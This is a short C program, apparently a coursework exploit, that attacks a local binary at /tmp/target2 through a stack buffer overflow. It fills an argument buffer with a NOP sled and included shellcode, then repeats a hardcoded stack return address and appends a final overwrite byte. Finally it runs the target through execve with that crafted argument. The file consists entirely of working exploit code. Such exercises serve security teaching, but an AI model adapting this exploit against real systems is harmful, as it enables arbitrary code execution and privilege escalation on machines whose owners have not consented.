#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BUFFER 120
#define FP 4
#define BUFFER_2 120
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  args[2] = NULL;
  env[0] = NULL;

  //char *buff_address = "\x98\xfc\xff\xbf";
  char *buff_address = "\x98\xfc\xff\xbf";
  char last_byte = '\x50';

  if (!(args[1] = (char *)malloc((BUFFER + BUFFER_2 + 1) * sizeof(char))))
  {
    exit(EXIT_FAILURE);
  }

  int i, j, x;
  for (i = 0; i < BUFFER - strlen(shellcode); ++i)
  {
    args[1][i] = NOP;
  }

  for (i = i, j = 0; j < strlen(shellcode); ++i, ++j)
  {
    args[1][i] = shellcode[j];
  }

  for (x = 0; x < BUFFER_2;)  {
    for (i = i, j = 0; j < FP; ++i, ++j, ++x) {
      args[1][i] = buff_address[j];
    };
  }

  args[1][i] = last_byte;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
